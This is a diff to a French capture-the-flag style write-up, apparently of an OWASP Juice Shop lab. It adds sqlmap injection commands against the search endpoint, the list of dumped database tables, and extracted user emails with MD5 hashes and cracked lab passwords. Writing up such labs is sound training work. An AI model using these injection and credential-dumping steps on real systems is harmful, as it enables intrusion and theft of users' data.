@@ -93,7 +93,40 @@ Cette requête nous retourne :
 sqlmap -u "http://owasp.thm:3000/rest/products/search?q=*" -p q \
   --dbms=SQLite --prefix="'))" --suffix="-- " \
   --tables --batch
+```
 
+Récupération de la liste complète des tables de la base de données
+
+```
+[10:48:24] [INFO] fetching tables for database: 'SQLite_masterdb'
+<current>
+[21 tables]
++-------------------+
+| Addresses         |
+| BasketItems       |
+| Baskets           |
+| Captchas          |
+| Cards             |
+| Challenges        |
+| Complaints        |
+| Deliveries        |
+| Feedbacks         |
+| Hints             |
+| ImageCaptchas     |
+| Memories          |
+| PrivacyRequests   |
+| Products          |
+| Quantities        |
+| Recycles          |
+| SecurityAnswers   |
+| SecurityQuestions |
+| Users             |
+| Wallets           |
+| sqlite_sequence   |
++-------------------+
+```
+
+```
 # Extraction des emails et mots de passe
 sqlmap -u "http://owasp.thm:3000/rest/products/search?q=*" -p q \
   --dbms=SQLite \
@@ -103,6 +136,19 @@ sqlmap -u "http://owasp.thm:3000/rest/products/search?q=*" -p q \
   --no-cast \
   --threads=1 --delay=0.3 --batch -v 2
 ```
+
+Résultats de l'exploitation
+
+```
++----------------------------+---------------------------------------------+
+| email                      | password                                    |
++----------------------------+---------------------------------------------+
+| admin@juice-sh.op          | 0192023a7bbd73250516f069df18b500 (admin123) |
+| jim@juice-sh.op            | e541ca7ecf72b8d1286474fc613e5e45 (ncc-1701) |
+| demo                       | fe01ce2a7fbac8fafaed7c982a04e229 (demo)     |
+...
+```
+
 
 
 ### Analyse de la vulnérabilité
